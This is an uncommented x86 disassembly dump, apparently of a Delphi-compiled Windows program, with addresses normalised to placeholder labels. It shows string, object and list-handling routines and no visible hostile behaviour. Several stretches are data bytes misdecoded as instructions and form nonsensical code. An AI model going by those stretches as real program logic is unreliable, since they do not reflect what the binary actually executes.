mov edx [ ebp - 0x2c ]
mov eax [ ebx ]
mov eax [ eax + 0x78 ]
call sub_473e08
lea ecx [ ebp - 0x34 ]
mov eax [ ebx ]
mov eax [ eax + 0x68 ]
mov edx r-xdata
call sub_478274
mov eax [ ebp - 0x34 ]
lea edx [ ebp - 0x30 ]
call sub_47d5b4
mov edx [ ebp - 0x30 ]
mov eax [ ebx ]
mov eax [ eax + 0x98 ]
call sub_477638
lea ecx [ ebp - 0x3c ]
mov eax [ ebx ]
mov eax [ eax + 0x68 ]
mov edx r-xdata
call sub_478274
mov eax [ ebp - 0x3c ]
lea edx [ ebp - 0x38 ]
call sub_47d5b4
mov edx [ ebp - 0x38 ]
mov eax [ ebx ]
mov eax [ eax + 0x3c ]
call sub_477638
lea ecx [ ebp - 0x40 ]
mov eax [ ebx ]
mov eax [ eax + 0x68 ]
mov edx r-xdata
call sub_478274
mov edx [ ebp - 0x40 ]
mov eax [ ebx ]
add eax 0x88
call sub_40416c
lea ecx [ ebp - 0x44 ]
mov eax [ ebx ]
mov eax [ eax + 0x68 ]
mov edx r-xdata
call sub_478274
mov edx [ ebp - 0x44 ]
mov eax [ ebx ]
mov eax [ eax + 0x94 ]
call sub_476ed0
lea edx [ ebp - 0x48 ]
mov eax [ ebx ]
mov eax [ eax + 0x94 ]
call sub_476c60
mov eax [ ebp - 0x48 ]
call sub_4043d8
test eax eax
jne r-xdata
lea ecx [ ebp - 0x50 ]
mov eax [ ebx ]
mov eax [ eax + 0x68 ]
mov edx r-xdata
call sub_478274
mov edx [ ebp - 0x50 ]
mov eax [ ebx ]
add eax 0x9c
call sub_40416c
lea ecx [ ebp - 0x54 ]
mov eax [ ebx ]
mov eax [ eax + 0x68 ]
mov edx r-xdata
call sub_478274
mov edx [ ebp - 0x54 ]
mov eax [ ebx ]
mov eax [ eax + 0xa0 ]
call sub_477638
lea ecx [ ebp - 0x58 ]
mov eax [ ebx ]
mov eax [ eax + 0x68 ]
mov edx r-xdata
call sub_478274
mov eax [ ebp - 0x58 ]
call sub_4747d4
mov eax [ ebx ]
fstp [ eax + 0x50 ]
fwait
lea ecx [ ebp - 0x5c ]
mov eax [ ebx ]
mov eax [ eax + 0x68 ]
mov edx r-xdata
call sub_478274
mov edx [ ebp - 0x5c ]
mov eax [ ebx ]
mov eax [ eax + 0xa4 ]
call sub_476ed0
lea ecx [ ebp - 0x60 ]
mov eax [ ebx ]
mov eax [ eax + 0x68 ]
mov edx r-xdata
call sub_478274
mov eax [ ebp - 0x60 ]
call sub_4043d8
test eax eax
jne r-xdata
lea ecx [ ebp - 0x4c ]
mov eax [ ebx ]
mov eax [ eax + 0x68 ]
mov edx r-xdata
call sub_478274
mov edx [ ebp - 0x4c ]
mov eax [ ebx ]
mov eax [ eax + 0x94 ]
call sub_476ed0
lea ecx [ ebp - 0x68 ]
mov eax [ ebx ]
mov eax [ eax + 0x68 ]
mov edx r-xdata
call sub_478274
mov eax [ ebp - 0x68 ]
call sub_4845ec
mov edx [ ebx ]
mov [ edx + 0x8c ] al
lea ecx [ ebp - 0x64 ]
mov eax [ ebx ]
mov eax [ eax + 0x68 ]
mov edx r-xdata
call sub_478274
mov eax [ ebp - 0x64 ]
call sub_4845ec
mov edx [ ebx ]
mov [ edx + 0x8c ] al
jmp r-xdata
lea ecx [ ebp - 0x8 ]
mov eax [ ebx ]
mov edx [ eax + 0x40 ]
mov eax [ ebx ]
mov eax [ eax + 0x70 ]
mov eax [ eax ]
call sub_483474
mov eax [ ebx ]
mov eax [ eax + 0x70 ]
mov edx [ ebp - 0x8 ]
call sub_48357c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_484b38
lea eax [ ebp - 0x68 ]
mov edx 0x19
call sub_40413c
retn
sub_484d4b
inc [ ebx ]
add [ eax ] al
add [ ebp + 0x55 ] dl
inc ebp
add [ ebp - 0x75 ] dl
in al dx
push ebx
cmp [ eax + 0x82 ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x4
mov ebx [ ebp + 0x8 ]
push ebx
mov ebx eax
mov eax [ ebx + 0x84 ]
call [ ebx + 0x80 ]
sub_484d7c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_484db8
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_484dbf
retn
mov eax rw-data
mov ecx 0x6
mov edx [ r-xdata ]
call sub_404bb4
sub_484dc4
push ebp
mov ebp esp
add esp 0xfffffff8
sub [ rw-data ] 0x1
jae r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ r-xdata ]
mov [ ebp - 0x8 ] eax
mov eax [ r-xdata ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x8 ]
mov edx 0x1
call sub_4182ac
sub_484df4
inc eax
dec esi
dec eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah dh
dec esi
dec eax
add [ edi + ecx * 2 ] bl
dec eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi ] al
dec edi
dec eax
add al dh
add [ eax ] al
add al al
mov [ edi ] sub_4221ec
pop eax
xor eax 0x1b400040
inc edx
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
inc eax
add al al

sub_484e3e
inc edi
add al bl
xchg ebx eax
inc ecx
add ah dh
sbb eax 0x92f40042
inc ecx
add ah cl
push ds
inc edx
add [ eax - 0x46 ] ah
inc edi
add ah bl
push ds
inc edx
add ah dl
pop ds
inc edx
add [ edx ] al
inc edx
add ah ch
push ds
inc edx
add ah ah
push ds
inc edx
add [ edx ] cl
inc edx
add [ edi + ecx * 2 + 0x48 ] cl
add [ eax ] al
push esp
inc edi
add [ eax ] bh
push esp
inc edi
add [ eax + 0x54 ] ch
inc edi
add [ eax ] bh
mov bl 0x47
add [ eax ] ch
mov edx 0xaebc0047
inc edi
add [ eax + esi * 4 - 0x3e2bffb9 ] bh
inc edi
add [ ebx + eax * 8 - 0x4e6fffb9 ] ah
inc edi
add [ eax ] al
mov bl 0x47
add [ eax ] dl
rol [ edi ] 0x58
mov bl 0x47
add al ah
mov bl 0x47
add [ eax - 0x4fffb84d ] al
mov ah 0x47
add [ edi + esi * 4 + 0x47 ] bl
add [ edx + edi * 4 ] bh
inc edi
add [ eax ] al
mov ebx 0xbe9c0047
inc edi
add ah bh
mov esi 0xbd340047
inc edi
add [ eax ] cl
int3
sub_484f4c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_47cb80
mov [ esi + 0xe8 ] 0x4f
lea eax [ esi + 0xec ]
mov edx r-xdata
call sub_40416c
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax esi
pop esi
pop ebx
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_484fa8
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
xor edx edx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0xc ] edx
mov ebx eax
xor eax eax
push ebp
push sub_485094
push [ fs : eax ]
mov [ fs : eax ] esp
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_41bde8
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_485072
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x1 ]
mov edx [ ebp - 0x8 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x3c ]
mov [ ebp - 0x4 ] eax
push 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ eax + 0x6c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_483b70
mov esi eax
lea ecx [ ebp - 0xc ]
mov eax [ ebx + 0x6c ]
mov edx r-xdata
call sub_41a68c
mov edx [ ebp - 0xc ]
mov eax esi
call sub_483848
lea ecx [ ebp - 0x10 ]
mov eax [ ebx + 0x6c ]
mov edx r-xdata
call sub_41a68c
mov edx [ ebp - 0x10 ]
mov eax esi
call sub_483814
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x4 ]
mov eax [ esi + 0x40 ]
mov ecx [ eax ]
call [ ecx + 0x2c ]
mov eax ebx
call sub_40331c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_485079
lea eax [ ebp - 0x8 ]
call sub_40d814
retn
sub_4850e0
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
mov ebx eax
xor eax eax
push ebp
push sub_4851fb
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0xc ]
xor eax eax
call sub_473f4c
push 0xffff
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_41ba0c
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_4851d9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x1 ]
mov edx [ ebp - 0x8 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x3c ]
mov [ ebp - 0x4 ] eax
push 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ eax + 0x6c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_483938
mov esi eax
lea ecx [ ebp - 0x10 ]
mov eax [ ebx + 0x6c ]
mov edx r-xdata
call sub_41a68c
mov edx [ ebp - 0x10 ]
mov eax esi
call sub_483848
lea ecx [ ebp - 0x14 ]
mov eax [ ebx + 0x6c ]
mov edx r-xdata
call sub_41a68c
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_483814
lea ecx [ ebp - 0x18 ]
mov eax [ ebx + 0x6c ]
mov edx r-xdata
call sub_41a68c
mov edx [ ebp - 0x18 ]
mov eax esi
call sub_483aa0
lea eax [ esi + 0x48 ]
mov edx [ ebx + 0x68 ]
call sub_40416c
lea eax [ esi + 0x38 ]
mov edx [ ebp - 0xc ]
call sub_40416c
mov eax ebx
call sub_40331c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4851e0
lea eax [ ebp - 0x8 ]
call sub_40d814
retn
sub_485264
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x10 ] ebx
mov esi ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_4853eb
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x1 ] 0x0
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x7d ] 0x0
je r-xdata
xor ecx ecx
xor edx edx
mov eax [ ebp - 0xc ]
mov ebx [ eax ]
call [ ebx + 0x30 ]
xor eax eax
push ebp
push sub_4853c9
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
push 0x1
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x34 ]
mov ecx esi
mov eax [ ebp - 0xc ]
call sub_47c530
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
xor edx edx
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
retn
test ebx ebx
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4853f2
lea eax [ ebp - 0x14 ]
mov edx 0x2
call sub_40413c
retn
test ebx ebx
jne r-xdata
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov eax [ r-xdata ]
call sub_47eba0
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x10 ]
call sub_4045d8
cmp [ eax ] 0x2e2e
jne r-xdata
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_479bfc
mov [ ebx + 0x74 ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x40 ]
mov al [ ebx + 0x70 ]
sub al 0x1
jb r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
jmp r-xdata
lea eax [ ebp - 0x10 ]
mov ecx 0x1
mov edx 0x1
call sub_404678
push 0xffffffff
lea eax [ ebp - 0x10 ]
push eax
or ecx 0xffffffff
mov edx r-xdata
mov eax [ ebp - 0xc ]
mov edi [ eax ]
call [ edi + 0x70 ]
mov eax [ ebp - 0x10 ]
mov edx esi
call sub_404524
je r-xdata
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_405f7c
mov ecx [ ebp - 0x14 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd8c
call sub_403ad0
jmp r-xdata
je r-xdata
test ebx ebx
jne r-xdata
push ebp
mov eax ebx
call sub_484fa8
pop ecx
mov ebx eax
jmp r-xdata
dec al
je r-xdata
push ebp
mov eax ebx
call sub_4850e0
pop ecx
mov ebx eax
jmp r-xdata
sub_4853ff
inc [ ecx ]
add [ eax ] al
add [ edx ] cl
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
push ecx
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_484048
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_48544c
push [ fs : eax ]
mov [ fs : eax ] esp
xor ecx ecx
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_47c084
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_485453
lea eax [ ebp - 0x4 ]
call sub_40d814
retn
sub_485458
push ebp
mov ebp esp
mov ecx 0x7
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
push ebx
push esi
push edi
mov ebx eax
xor eax eax
push ebp
push sub_485666
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0xc ]
mov eax ebx
call sub_4837e4
mov eax [ ebp - 0xc ]
call sub_4043d8
test eax eax
jne r-xdata
lea edx [ ebp - 0x10 ]
mov eax ebx
call sub_4837a8
mov eax [ ebp - 0x10 ]
call sub_4043d8
test eax eax
jne r-xdata
mov edx r-xdata
mov eax ebx
call sub_483848
lea edx [ ebp - 0x18 ]
mov eax ebx
call sub_4837e4
mov ecx [ ebp - 0x18 ]
lea eax [ ebp - 0x14 ]
mov edx r-xdata
call sub_404424
mov edx [ ebp - 0x14 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x7c ]
lea edx [ ebp - 0x20 ]
mov eax ebx
call sub_4837a8
mov ecx [ ebp - 0x20 ]
lea eax [ ebp - 0x1c ]
mov edx r-xdata
call sub_404424
mov edx [ ebp - 0x1c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x7c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
xor ecx ecx
mov edx [ ebx + 0x24 ]
call sub_47c084
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
xor edx edx
mov ecx [ eax ]
call [ ecx + 0x7c ]
lea edx [ ebp - 0x24 ]
mov eax ebx
call sub_4837a8
mov eax [ ebp - 0x24 ]
mov edx r-xdata
call sub_408248
test al al
je r-xdata
mov edx r-xdata
mov eax ebx
call sub_483814
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
xor ecx ecx
mov edx [ ebx + 0x40 ]
call sub_47c084
mov eax [ ebx + 0x40 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
xor edx edx
mov ecx [ eax ]
call [ ecx + 0x7c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48566d
lea eax [ ebp - 0x3c ]
mov edx 0xd
call sub_40413c
lea eax [ ebp - 0x4 ]
call sub_404118
retn
inc eax
mov [ ebp - 0x8 ] eax
xor esi esi
lea ecx [ ebp - 0x38 ]
mov edx esi
mov eax [ ebx + 0x40 ]
mov edi [ eax ]
call [ edi + 0xc ]
lea eax [ ebp - 0x38 ]
mov edx r-xdata
call sub_4043e0
mov edx [ ebp - 0x38 ]
lea ecx [ ebp - 0x4 ]
mov eax [ r-xdata ]
call sub_47f1d8
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5 ] 0x2
jne r-xdata
lea ecx [ ebp - 0x34 ]
mov edx esi
mov eax [ ebx + 0x40 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov ecx [ ebp - 0x34 ]
lea eax [ ebp - 0x30 ]
mov edx r-xdata
call sub_404424
mov ecx [ ebp - 0x30 ]
mov edx esi
mov eax [ ebx + 0x40 ]
mov edi [ eax ]
call [ edi + 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x78 ]
lea edx [ ebp - 0x3c ]
mov eax [ ebp - 0x4 ]
call sub_47de84
mov edx [ ebp - 0x3c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x78 ]
jmp r-xdata
lea eax [ ebp - 0x28 ]
push eax
lea ecx [ ebp - 0x2c ]
mov edx esi
mov eax [ ebx + 0x40 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x2c ]
mov ecx 0x1
mov edx 0x1
call sub_404638
mov eax [ ebp - 0x28 ]
mov edx r-xdata
call sub_404524
jne r-xdata
jmp r-xdata
inc esi
dec [ ebp - 0x8 ]
jne r-xdata
sub_4856ef
inc [ edx ]
add [ eax ] al
add [ 0x5500000a ] cl
mov ebp esp
mov ecx 0x14
push 0x0
push 0x0
dec ecx
jne r-xdata
push ebx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_485e0c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
cmp [ eax + 0x60 ] 0x0
sete [ ebp - 0x19 ]
lea eax [ ebp - 0x14 ]
call sub_404118
lea ecx [ ebp - 0x20 ]
lea edx [ ebp - 0x21 ]
lea eax [ ebp - 0x5 ]
call sub_47dcf4
xor ecx ecx
mov dl 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x30 ]
xor edx edx
push ebp
push sub_485dcf
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x6c ]
cmp [ eax + 0x20 ] 0x0
jle r-xdata
cmp [ eax + 0x2c ] 0x1
jle r-xdata
cmp [ ebp - 0x19 ] 0x0
je r-xdata
push 0x0
lea edx [ ebp - 0x84 ]
mov eax [ rw-data ]
call sub_405f7c
mov eax [ ebp - 0x84 ]
mov [ ebp - 0x34 ] eax
mov [ ebp - 0x30 ] 0xb
lea ecx [ ebp - 0x34 ]
mov dl 0x5
mov eax [ ebp - 0x4 ]
call sub_475344
cmp [ ebp - 0x5 ] 0x2
jne r-xdata
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x7c ]
xor edx edx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x7c ]
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x6c ]
call sub_419a38
dec eax
test eax eax
jl r-xdata
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xac ]
xor edx edx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x7c ]
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x7c ]
xor edx edx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x7c ]
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x6c ]
cmp [ eax + 0x28 ] 0x0
jle r-xdata
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xac ]
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x34 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jl r-xdata
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x7c ]
jmp r-xdata
inc eax
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x10 ] 0x0
cmp [ ebp - 0x19 ] 0x0
je r-xdata
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x7c ]
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x7c ]
xor edx edx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x7c ]
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x6c ]
call sub_419a38
dec eax
test eax eax
jl r-xdata
lea eax [ ebp - 0x14 ]
mov edx r-xdata
call sub_4041b0
lea eax [ ebp - 0x14 ]
mov edx r-xdata
call sub_4041b0
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_485dd6
mov dl 0x1
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
retn
inc eax
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x10 ] 0x0
inc [ ebp - 0x10 ]
dec [ ebp - 0x28 ]
jne r-xdata
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x7c ]
push 0x0
lea edx [ ebp - 0x80 ]
mov eax [ rw-data ]
call sub_405f7c
mov eax [ ebp - 0x80 ]
mov [ ebp - 0x34 ] eax
mov [ ebp - 0x30 ] 0xb
lea ecx [ ebp - 0x34 ]
mov dl 0x5
mov eax [ ebp - 0x4 ]
call sub_475344
push ebp
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x6c ]
mov edx [ ebp - 0x10 ]
call sub_483d30
mov edx [ r-xdata ]
call sub_4034cc
call sub_485458
pop ecx
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x6c ]
call sub_419a38
dec eax
test eax eax
jl r-xdata
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x7c ]
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x7c ]
xor edx edx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x7c ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xac ]
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x7c ]
jmp r-xdata
inc eax
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x10 ] 0x0
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x6c ]
cmp [ eax + 0x2c ] 0x1
jle r-xdata
lea eax [ ebp - 0x2c ]
mov ecx [ ebp - 0x14 ]
mov edx r-xdata
call sub_404424
mov edx [ ebp - 0x2c ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x7c ]
jmp r-xdata
lea ecx [ ebp - 0xa0 ]
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x10 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ ebp - 0xa0 ]
lea edx [ ebp - 0x9c ]
call sub_47de84
mov edx [ ebp - 0x9c ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x7c ]
lea ecx [ ebp - 0x98 ]
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x10 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ ebp - 0x98 ]
lea edx [ ebp - 0x94 ]
call sub_47de84
mov ecx [ ebp - 0x94 ]
lea eax [ ebp - 0x90 ]
mov edx r-xdata
call sub_404424
mov edx [ ebp - 0x90 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x7c ]
jmp r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x6c ]
mov edx [ ebp - 0x10 ]
call sub_483d30
mov edx [ r-xdata ]
call sub_4034a8
test al al
je r-xdata
cmp [ ebp - 0x19 ] 0x0
je r-xdata
inc eax
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x10 ] 0x0
inc [ ebp - 0x10 ]
dec [ ebp - 0x28 ]
jne r-xdata
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x7c ]
push 0x0
lea edx [ ebp - 0x38 ]
mov eax [ rw-data ]
call sub_405f7c
mov eax [ ebp - 0x38 ]
mov [ ebp - 0x34 ] eax
mov [ ebp - 0x30 ] 0xb
lea ecx [ ebp - 0x34 ]
mov dl 0x5
mov eax [ ebp - 0x4 ]
call sub_475344
push ebp
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x6c ]
mov edx [ ebp - 0x10 ]
call sub_483d30
mov edx [ r-xdata ]
call sub_4034cc
call sub_485458
pop ecx
xor edx edx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x7c ]
lea eax [ ebp - 0x88 ]
push eax
lea ecx [ ebp - 0x8c ]
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x10 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ ebp - 0x8c ]
mov ecx 0x1
mov edx 0x1
call sub_404638
mov eax [ ebp - 0x88 ]
mov edx r-xdata
call sub_404524
jne r-xdata
jmp r-xdata
inc [ ebp - 0x10 ]
dec [ ebp - 0x28 ]
jne r-xdata
push r-xdata
push [ ebp - 0x14 ]
push r-xdata
lea eax [ ebp - 0x7c ]
mov edx 0x3
call sub_404498
mov edx [ ebp - 0x7c ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x7c ]
jmp r-xdata
inc [ ebp - 0x10 ]
dec [ ebp - 0x28 ]
jne r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x6c ]
mov edx [ ebp - 0x10 ]
call sub_483d30
mov ebx eax
push 0x0
lea edx [ ebp - 0x3c ]
mov eax [ rw-data ]
call sub_405f7c
mov eax [ ebp - 0x3c ]
mov [ ebp - 0x34 ] eax
mov [ ebp - 0x30 ] 0xb
lea ecx [ ebp - 0x34 ]
mov dl 0x5
mov eax [ ebp - 0x4 ]
call sub_475344
cmp [ ebp - 0x19 ] 0x0
je r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x6c ]
mov edx [ ebp - 0x10 ]
call sub_483d30
mov edx [ r-xdata ]
call sub_4034a8
test al al
je r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x6c ]
mov edx [ ebp - 0x10 ]
call sub_483d30
mov edx [ r-xdata ]
call sub_4034a8
test al al
je r-xdata
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_479bfc
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_485b6b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x6c ]
mov edx [ ebp - 0x10 ]
call sub_483d30
mov edx [ ebp - 0x18 ]
call sub_483a04
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_485b72
lea eax [ ebp - 0x18 ]
call sub_40d814
retn
xor edx edx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x7c ]
lea eax [ ebp - 0x40 ]
mov ecx [ ebp - 0x14 ]
mov edx r-xdata
call sub_404424
mov edx [ ebp - 0x40 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x7c ]
lea edx [ ebp - 0x44 ]
mov eax ebx
call sub_4837a8
mov eax [ ebp - 0x44 ]
call sub_4043d8
test eax eax
jne r-xdata
lea edx [ ebp - 0x48 ]
mov eax ebx
call sub_483a6c
mov eax [ ebp - 0x48 ]
call sub_4043d8
test eax eax
jne r-xdata
mov edx r-xdata
mov eax ebx
call sub_483814
lea edx [ ebp - 0x4c ]
mov eax ebx
call sub_4837a8
mov eax [ ebp - 0x4c ]
mov edx r-xdata
call sub_404524
jne r-xdata
mov edx r-xdata
mov eax ebx
call sub_483aa0
push r-xdata
lea edx [ ebp - 0x58 ]
mov eax ebx
call sub_4837e4
push [ ebp - 0x58 ]
push r-xdata
lea eax [ ebp - 0x54 ]
mov edx 0x3
call sub_404498
mov edx [ ebp - 0x54 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x7c ]
push r-xdata
lea edx [ ebp - 0x60 ]
mov eax [ ebx + 0x48 ]
call sub_408abc
push [ ebp - 0x60 ]
push r-xdata
lea eax [ ebp - 0x5c ]
mov edx 0x3
call sub_404498
mov edx [ ebp - 0x5c ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x7c ]
lea edx [ ebp - 0x68 ]
mov eax ebx
call sub_4837a8
mov ecx [ ebp - 0x68 ]
lea eax [ ebp - 0x64 ]
mov edx r-xdata
call sub_404424
mov edx [ ebp - 0x64 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x7c ]
